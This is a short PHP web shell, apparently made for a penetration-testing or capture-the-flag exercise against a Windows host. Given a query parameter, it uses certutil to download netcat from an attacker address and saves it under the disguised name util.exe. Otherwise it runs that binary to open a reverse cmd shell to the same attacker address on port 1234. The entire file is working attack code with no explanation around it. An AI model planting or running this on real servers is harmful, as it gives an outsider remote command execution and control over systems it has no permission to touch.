<?php

//if necessary pass get to download nc from the attacker 
if ($_GET["get"]) {system("certutil.exe -urlcache -f http://10.9.2.142:8000/nc.exe util.exe");}

else {
	 //check if exists
	 if(file_exists("./util.exe")){
		 echo "Util exists";
		 //execute the reverse shell
		 system("util.exe 10.9.2.142 1234 -e cmd");
 }
}

?>
